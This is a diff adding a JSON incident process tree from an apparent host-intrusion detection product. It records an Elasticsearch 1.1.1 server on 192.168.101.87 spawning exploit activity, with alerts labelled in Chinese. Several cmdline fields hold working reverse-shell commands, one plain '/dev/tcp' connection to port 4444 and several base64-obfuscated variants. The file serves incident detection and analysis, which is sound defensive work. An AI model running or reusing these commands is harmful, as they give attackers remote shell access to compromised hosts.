@@ -1,0 +1,618 @@
+{
+  "data": {
+    "root": {
+      "node_type": "host",
+      "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+      "name": "192.168.101.87",
+      "children": [
+        {
+          "node_type": "proc",
+          "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+          "host_ip": "192.168.101.87",
+          "pid": "1",
+          "guid": "1-1615281483",
+          "cmdline": "/usr/lib/systemd/systemd --switched-root --system --deserialize 22",
+          "pcmdline": "",
+          "proc_file": {
+            "name": "systemd",
+            "path": "/usr/lib/systemd/systemd",
+            "mode": "8000755",
+            "md5": "e4b9902024ac32b3ca37f6b4c9b841e8",
+            "sha256": "81b37dcb0321108e564d528df827580153ab64005be3bcafd5162e9e7e707e85",
+            "change_time": 1590058422,
+            "access_time": 1618329991,
+            "modify_time": 1540942340
+          },
+          "pproc_file": {
+            "path": "",
+            "name": ""
+          },
+          "first_time": 1.61837691417E9,
+          "last_time": 1.61837811424E9,
+          "actions": [],
+          "threat_name_list": [],
+          "indices": [
+            "incident_tree_log",
+            "prod_snapshot_000000000000"
+          ],
+          "children": [
+            {
+              "node_type": "proc",
+              "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+              "host_ip": "192.168.101.87",
+              "ppid": "1",
+              "pid": "16551",
+              "guid": "16551-1619505602",
+              "pguid": "1-1615281483",
+              "cmdline": "bash -i",
+              "pcmdline": "/usr/lib/systemd/systemd --switched-root --system --deserialize 22",
+              "proc_file": {
+                "name": "bash",
+                "path": "/usr/bin/bash"
+              },
+              "pproc_file": {
+                "path": "/usr/lib/systemd/systemd",
+                "name": "systemd"
+              },
+              "first_time": 1.619506208325E9,
+              "last_time": 1.619506208325E9,
+              "actions": [],
+              "threat_name_list": [
+                "高CPU使用"
+              ],
+              "indices": [
+                "prod_incidents_000000000000"
+              ]
+            }
+          ]
+        },
+        {
+          "node_type": "proc",
+          "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+          "host_ip": "192.168.101.87",
+          "ppid": "11463",
+          "pid": "14129",
+          "guid": "14129-1619505167",
+          "pguid": "11463-1619504790",
+          "cmdline": "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjgwLjEvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}",
+          "pcmdline": "/bin/java -Xms256m -Xmx1g -Xss256k -Djava.awt.headless=true -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+HeapDumpOnOutOfMemoryError -Delasticsearch -Des.foreground=yes -Des.path.home=/home/sunlibo/elasticsearch-1.1.1 -cp :/home/sunlibo/elasticsearch-1.1.1/lib/elasticsearch-1.1.1.jar:/home/sunlibo/elasticsearch-1.1.1/lib/*:/home/sunlibo/elasticsearch-1.1.1/lib/sigar/* org.elasticsearch.bootstrap.Elasticsearch",
+          "proc_file": {
+            "name": "bash",
+            "path": "/usr/bin/bash",
+            "mode": "0100755",
+            "md5": "285044ad8f8b9322d0cc5e929e2cc18c",
+            "sha256": "5975d972eea6b1c53ef9a69452797439ed5bf63fae72e1780761ea1c2cb6976a",
+            "change_time": 1590058366,
+            "access_time": 1618996801,
+            "modify_time": 1540919233
+          },
+          "pproc_file": {
+            "path": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java",
+            "name": "java"
+          },
+          "first_time": 1.619505167493E9,
+          "last_time": 1.619505167493E9,
+          "actions": [],
+          "threat_name_list": [
+            "可疑java漏洞利用"
+          ],
+          "indices": [
+            "prod_incidents_000000000000",
+            "prod_signals_000000000000"
+          ],
+          "children": [
+            {
+              "node_type": "proc",
+              "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+              "host_ip": "192.168.101.87",
+              "ppid": "14129",
+              "pid": "14132",
+              "guid": "14132-1619505167",
+              "pguid": "14129-1619505167",
+              "cmdline": "base64 -d",
+              "pcmdline": "/bin/java -Xms256m -Xmx1g -Xss256k -Djava.awt.headless=true -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyF",
+              "proc_file": {
+                "name": "base64",
+                "path": "/usr/bin/base64",
+                "mode": "0100755",
+                "md5": "a3bf1e4bd343b156e94bcd8aefb70c75",
+                "sha256": "482d7ed2511ae531a5fd70af339020cf529164afef5e7b8eb33a79b9756b4688",
+                "change_time": 1590058381,
+                "access_time": 1619366403,
+                "modify_time": 1540926961
+              },
+              "pproc_file": {
+                "path": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java",
+                "name": "java"
+              },
+              "first_time": 1.619505167499E9,
+              "last_time": 1.619505167499E9,
+              "actions": [],
+              "threat_name_list": [
+                "Base64解密行为"
+              ],
+              "indices": [
+                "prod_incidents_000000000000",
+                "prod_signals_000000000000"
+              ]
+            }
+          ]
+        },
+        {
+          "node_type": "proc",
+          "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+          "host_ip": "192.168.101.87",
+          "ppid": "14133",
+          "pid": "14142",
+          "guid": "14142-1619505167",
+          "pguid": "14133-1619505167",
+          "cmdline": "bash -i",
+          "proc_file": {
+            "name": "bash",
+            "path": "/usr/bin/bash",
+            "mode": "",
+            "md5": "285044ad8f8b9322d0cc5e929e2cc18c",
+            "sha256": "5975d972eea6b1c53ef9a69452797439ed5bf63fae72e1780761ea1c2cb6976a",
+            "change_time": 1590058366,
+            "access_time": 1618996801,
+            "modify_time": 1540919233
+          },
+          "first_time": 1.619505167516E9,
+          "last_time": 1.619505167516E9,
+          "actions": [
+            "net"
+          ],
+          "threat_name_list": [
+            "bash反弹Shell"
+          ],
+          "indices": [
+            "prod_incidents_000000000000",
+            "prod_signals_000000000000"
+          ]
+        },
+        {
+          "node_type": "proc",
+          "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+          "host_ip": "192.168.101.87",
+          "ppid": "14802",
+          "pid": "14835",
+          "guid": "14835-1619505306",
+          "pguid": "14802-1619505304",
+          "cmdline": "base64 -d",
+          "pcmdline": "-bash",
+          "proc_file": {
+            "name": "base64",
+            "path": "/usr/bin/base64",
+            "mode": "0100755",
+            "md5": "a3bf1e4bd343b156e94bcd8aefb70c75",
+            "sha256": "482d7ed2511ae531a5fd70af339020cf529164afef5e7b8eb33a79b9756b4688",
+            "change_time": 1590058381,
+            "access_time": 1619366403,
+            "modify_time": 1540926961
+          },
+          "pproc_file": {
+            "path": "/usr/bin/bash",
+            "name": "bash"
+          },
+          "first_time": 1.619505306789E9,
+          "last_time": 1.619505306789E9,
+          "actions": [],
+          "threat_name_list": [
+            "Base64解密行为"
+          ],
+          "indices": [
+            "prod_incidents_000000000000"
+          ]
+        },
+        {
+          "node_type": "proc",
+          "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+          "host_ip": "192.168.101.87",
+          "ppid": "14802",
+          "pid": "14935",
+          "guid": "14935-1619505323",
+          "pguid": "14802-1619505304",
+          "cmdline": "-bash",
+          "proc_file": {
+            "name": "bash",
+            "path": "/usr/bin/bash",
+            "mode": "",
+            "md5": "285044ad8f8b9322d0cc5e929e2cc18c",
+            "sha256": "5975d972eea6b1c53ef9a69452797439ed5bf63fae72e1780761ea1c2cb6976a",
+            "change_time": 1590058366,
+            "access_time": 1618996801,
+            "modify_time": 1540919233
+          },
+          "first_time": 1.619505323521E9,
+          "last_time": 1.619505323521E9,
+          "actions": [
+            "net"
+          ],
+          "threat_name_list": [
+            "bash反弹Shell"
+          ],
+          "indices": [
+            "prod_incidents_000000000000",
+            "prod_signals_000000000000"
+          ]
+        },
+        {
+          "node_type": "proc",
+          "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+          "host_ip": "192.168.101.87",
+          "ppid": "14802",
+          "pid": "15525",
+          "guid": "15525-1619505438",
+          "pguid": "14802-1619505304",
+          "cmdline": "-bash",
+          "proc_file": {
+            "name": "bash",
+            "path": "/usr/bin/bash",
+            "mode": "",
+            "md5": "285044ad8f8b9322d0cc5e929e2cc18c",
+            "sha256": "5975d972eea6b1c53ef9a69452797439ed5bf63fae72e1780761ea1c2cb6976a",
+            "change_time": 1590058366,
+            "access_time": 1618996801,
+            "modify_time": 1540919233
+          },
+          "first_time": 1.619505438893E9,
+          "last_time": 1.619505438893E9,
+          "actions": [
+            "net"
+          ],
+          "threat_name_list": [
+            "bash反弹Shell"
+          ],
+          "indices": [
+            "prod_incidents_000000000000",
+            "prod_signals_000000000000"
+          ]
+        },
+        {
+          "node_type": "proc",
+          "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+          "host_ip": "192.168.101.87",
+          "ppid": "11463",
+          "pid": "15812",
+          "guid": "15812-1619505496",
+          "pguid": "11463-1619504790",
+          "cmdline": "bash -i >& /dev/tcp/192.168.62.181/4444 0>&1",
+          "pcmdline": "/bin/java -Xms256m -Xmx1g -Xss256k -Djava.awt.headless=true -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+HeapDumpOnOutOfMemoryError -Delasticsearch -Des.foreground=yes -Des.path.home=/home/sunlibo/elasticsearch-1.1.1 -cp :/home/sunlibo/elasticsearch-1.1.1/lib/elasticsearch-1.1.1.jar:/home/sunlibo/elasticsearch-1.1.1/lib/*:/home/sunlibo/elasticsearch-1.1.1/lib/sigar/* org.elasticsearch.bootstrap.Elasticsearch",
+          "proc_file": {
+            "name": "bash",
+            "path": "/usr/bin/bash",
+            "mode": "0100755",
+            "md5": "285044ad8f8b9322d0cc5e929e2cc18c",
+            "sha256": "5975d972eea6b1c53ef9a69452797439ed5bf63fae72e1780761ea1c2cb6976a",
+            "change_time": 1590058366,
+            "access_time": 1618996801,
+            "modify_time": 1540919233
+          },
+          "pproc_file": {
+            "path": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java",
+            "name": "java"
+          },
+          "first_time": 1.619505496815E9,
+          "last_time": 1.619505496815E9,
+          "actions": [],
+          "threat_name_list": [
+            "可疑java漏洞利用",
+            "反弹shell进程"
+          ],
+          "indices": [
+            "prod_incidents_000000000000",
+            "prod_signals_000000000000"
+          ]
+        },
+        {
+          "node_type": "proc",
+          "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+          "host_ip": "192.168.101.87",
+          "ppid": "14802",
+          "pid": "16174",
+          "guid": "16174-1619505565",
+          "pguid": "14802-1619505304",
+          "cmdline": "base64 -d",
+          "pcmdline": "-bash",
+          "proc_file": {
+            "name": "base64",
+            "path": "/usr/bin/base64",
+            "mode": "0100755",
+            "md5": "a3bf1e4bd343b156e94bcd8aefb70c75",
+            "sha256": "482d7ed2511ae531a5fd70af339020cf529164afef5e7b8eb33a79b9756b4688",
+            "change_time": 1590058381,
+            "access_time": 1619366403,
+            "modify_time": 1540926961
+          },
+          "pproc_file": {
+            "path": "/usr/bin/bash",
+            "name": "bash"
+          },
+          "first_time": 1.619505565113E9,
+          "last_time": 1.619505565113E9,
+          "actions": [],
+          "threat_name_list": [
+            "Base64解密行为"
+          ],
+          "indices": [
+            "prod_incidents_000000000000"
+          ]
+        },
+        {
+          "node_type": "proc",
+          "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+          "host_ip": "192.168.101.87",
+          "ppid": "11463",
+          "pid": "16514",
+          "guid": "16514-1619505598",
+          "pguid": "11463-1619504790",
+          "cmdline": "id",
+          "pcmdline": "/bin/java -Xms256m -Xmx1g -Xss256k -Djava.awt.headless=true -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+HeapDumpOnOutOfMemoryError -Delasticsearch -Des.foreground=yes -Des.path.home=/home/sunlibo/elasticsearch-1.1.1 -cp :/home/sunlibo/elasticsearch-1.1.1/lib/elasticsearch-1.1.1.jar:/home/sunlibo/elasticsearch-1.1.1/lib/*:/home/sunlibo/elasticsearch-1.1.1/lib/sigar/* org.elasticsearch.bootstrap.Elasticsearch",
+          "proc_file": {
+            "name": "id",
+            "path": "/usr/bin/id",
+            "mode": "0100755",
+            "md5": "53ec1ef9fa33ba074bcb5b792ed42bba",
+            "sha256": "7a170d16b16bc29518de1251fcd38ed7d33e9eaa663d885bfc9c17bd954b3e76",
+            "change_time": 1590058381,
+            "access_time": 1619020803,
+            "modify_time": 1540926961
+          },
+          "pproc_file": {
+            "path": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java",
+            "name": "java"
+          },
+          "first_time": 1.619505598462E9,
+          "last_time": 1.619505598462E9,
+          "actions": [],
+          "threat_name_list": [
+            "可疑java漏洞利用"
+          ],
+          "indices": [
+            "prod_incidents_000000000000",
+            "prod_signals_000000000000"
+          ]
+        },
+        {
+          "node_type": "proc",
+          "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+          "host_ip": "192.168.101.87",
+          "ppid": "11463",
+          "pid": "16548",
+          "guid": "16548-1619505602",
+          "pguid": "11463-1619504790",
+          "cmdline": "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjYyLjE4MS80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}",
+          "pcmdline": "/bin/java -Xms256m -Xmx1g -Xss256k -Djava.awt.headless=true -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+HeapDumpOnOutOfMemoryError -Delasticsearch -Des.foreground=yes -Des.path.home=/home/sunlibo/elasticsearch-1.1.1 -cp :/home/sunlibo/elasticsearch-1.1.1/lib/elasticsearch-1.1.1.jar:/home/sunlibo/elasticsearch-1.1.1/lib/*:/home/sunlibo/elasticsearch-1.1.1/lib/sigar/* org.elasticsearch.bootstrap.Elasticsearch",
+          "proc_file": {
+            "name": "bash",
+            "path": "/usr/bin/bash",
+            "mode": "0100755",
+            "md5": "285044ad8f8b9322d0cc5e929e2cc18c",
+            "sha256": "5975d972eea6b1c53ef9a69452797439ed5bf63fae72e1780761ea1c2cb6976a",
+            "change_time": 1590058366,
+            "access_time": 1618996801,
+            "modify_time": 1540919233
+          },
+          "pproc_file": {
+            "path": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java",
+            "name": "java"
+          },
+          "first_time": 1.619505603035E9,
+          "last_time": 1.619505608325E9,
+          "actions": [],
+          "threat_name_list": [
+            "可疑java漏洞利用"
+          ],
+          "indices": [
+            "prod_incidents_000000000000",
+            "prod_signals_000000000000"
+          ],
+          "children": [
+            {
+              "node_type": "proc",
+              "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+              "host_ip": "192.168.101.87",
+              "ppid": "16548",
+              "pid": "16550",
+              "guid": "16550-1619505603",
+              "pguid": "16548-1619505602",
+              "cmdline": "base64 -d",
+              "pcmdline": "/bin/java -Xms256m -Xmx1g -Xss256k -Djava.awt.headless=true -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyF",
+              "proc_file": {
+                "name": "base64",
+                "path": "/usr/bin/base64",
+                "mode": "0100755",
+                "md5": "a3bf1e4bd343b156e94bcd8aefb70c75",
+                "sha256": "482d7ed2511ae531a5fd70af339020cf529164afef5e7b8eb33a79b9756b4688",
+                "change_time": 1590058381,
+                "access_time": 1619366403,
+                "modify_time": 1540926961
+              },
+              "pproc_file": {
+                "path": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java",
+                "name": "java"
+              },
+              "first_time": 1.619505603038E9,
+              "last_time": 1.619505603038E9,
+              "actions": [],
+              "threat_name_list": [
+                "Base64解密行为"
+              ],
+              "indices": [
+                "prod_incidents_000000000000",
+                "prod_signals_000000000000"
+              ]
+            }
+          ]
+        },
+        {
+          "node_type": "proc",
+          "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+          "host_ip": "192.168.101.87",
+          "ppid": "18342",
+          "pid": "18344",
+          "guid": "18344-1619505936",
+          "pguid": "18342-1619505936",
+          "cmdline": "base64 -d",
+          "pcmdline": "/bin/java -Xms256m -Xmx1g -Xss256k -Djava.awt.headless=true -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyF",
+          "proc_file": {
+            "name": "base64",
+            "path": "/usr/bin/base64",
+            "mode": "0100755",
+            "md5": "a3bf1e4bd343b156e94bcd8aefb70c75",
+            "sha256": "482d7ed2511ae531a5fd70af339020cf529164afef5e7b8eb33a79b9756b4688",
+            "change_time": 1590058381,
+            "access_time": 1619366403,
+            "modify_time": 1540926961
+          },
+          "pproc_file": {
+            "path": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java",
+            "name": "java"
+          },
+          "first_time": 1.619505936771E9,
+          "last_time": 1.619505936771E9,
+          "actions": [],
+          "threat_name_list": [
+            "Base64解密行为"
+          ],
+          "indices": [
+            "prod_incidents_000000000000"
+          ]
+        },
+        {
+          "node_type": "proc",
+          "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+          "host_ip": "192.168.101.87",
+          "ppid": "18345",
+          "pid": "18354",
+          "guid": "18354-1619505936",
+          "pguid": "18345-1619505936",
+          "cmdline": "bash -i",
+          "proc_file": {
+            "name": "bash",
+            "path": "/usr/bin/bash",
+            "mode": "",
+            "md5": "285044ad8f8b9322d0cc5e929e2cc18c",
+            "sha256": "5975d972eea6b1c53ef9a69452797439ed5bf63fae72e1780761ea1c2cb6976a",
+            "change_time": 1590058366,
+            "access_time": 1618996801,
+            "modify_time": 1540919233
+          },
+          "first_time": 1.619505936795E9,
+          "last_time": 1.619505936795E9,
+          "actions": [
+            "net"
+          ],
+          "threat_name_list": [
+            "bash反弹Shell"
+          ],
+          "indices": [
+            "prod_incidents_000000000000",
+            "prod_signals_000000000000"
+          ]
+        },
+        {
+          "node_type": "proc",
+          "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+          "host_ip": "192.168.101.87",
+          "ppid": "18118",
+          "pid": "22708",
+          "guid": "22708-1619506667",
+          "pguid": "18118-1619505901",
+          "cmdline": "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjYyLjE4MS80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}",
+          "pcmdline": "/bin/java -Xms256m -Xmx1g -Xss256k -Djava.awt.headless=true -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+HeapDumpOnOutOfMemoryError -Delasticsearch -Des.foreground=yes -Des.path.home=/home/sunlibo/elasticsearch-1.1.1 -cp :/home/sunlibo/elasticsearch-1.1.1/lib/elasticsearch-1.1.1.jar:/home/sunlibo/elasticsearch-1.1.1/lib/*:/home/sunlibo/elasticsearch-1.1.1/lib/sigar/* org.elasticsearch.bootstrap.Elasticsearch",
+          "proc_file": {
+            "name": "bash",
+            "path": "/usr/bin/bash"
+          },
+          "pproc_file": {
+            "path": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java",
+            "name": "java"
+          },
+          "first_time": 1.619506667498E9,
+          "last_time": 1.619506808325E9,
+          "actions": [],
+          "threat_name_list": [
+            "可疑java漏洞利用"
+          ],
+          "indices": [
+            "prod_incidents_000000000000",
+            "prod_signals_000000000000"
+          ],
+          "children": [
+            {
+              "node_type": "proc",
+              "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+              "host_ip": "192.168.101.87",
+              "ppid": "22708",
+              "pid": "22710",
+              "guid": "22710-1619506667",
+              "pguid": "22708-1619506667",
+              "cmdline": "base64 -d",
+              "pcmdline": "/bin/java -Xms256m -Xmx1g -Xss256k -Djava.awt.headless=true -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyF",
+              "proc_file": {
+                "name": "base64",
+                "path": "/usr/bin/base64",
+                "mode": "0100755",
+                "md5": "a3bf1e4bd343b156e94bcd8aefb70c75",
+                "sha256": "482d7ed2511ae531a5fd70af339020cf529164afef5e7b8eb33a79b9756b4688",
+                "change_time": 1590058381,
+                "access_time": 1619366403,
+                "modify_time": 1540926961
+              },
+              "pproc_file": {
+                "path": "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java",
+                "name": "java"
+              },
+              "first_time": 1.619506667508E9,
+              "last_time": 1.619506667508E9,
+              "actions": [],
+              "threat_name_list": [
+                "Base64解密行为"
+              ],
+              "indices": [
+                "prod_incidents_000000000000",
+                "prod_signals_000000000000"
+              ]
+            }
+          ]
+        },
+        {
+          "node_type": "proc",
+          "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+          "host_ip": "192.168.101.87",
+          "ppid": "22711",
+          "pid": "22721",
+          "guid": "22721-1619506667",
+          "pguid": "22711-1619506667",
+          "cmdline": "bash -i",
+          "proc_file": {
+            "name": "bash",
+            "path": "/usr/bin/bash",
+            "mode": "",
+            "md5": "285044ad8f8b9322d0cc5e929e2cc18c",
+            "sha256": "5975d972eea6b1c53ef9a69452797439ed5bf63fae72e1780761ea1c2cb6976a",
+            "change_time": 1590058366,
+            "access_time": 1618996801,
+            "modify_time": 1540919233
+          },
+          "first_time": 1.61950666753E9,
+          "last_time": 1.61950666753E9,
+          "actions": [
+            "net"
+          ],
+          "threat_name_list": [
+            "bash反弹Shell"
+          ],
+          "indices": [
+            "prod_incidents_000000000000",
+            "prod_signals_000000000000"
+          ]
+        }
+      ]
+    },
+    "umid": "38d738d6-c52e-4806-9994-c58ffbd6c788",
+    "incident_id": "039910fa-53be-3cb2-976f-7fc0223c2703"
+  },
+  "response_code": 0
+}
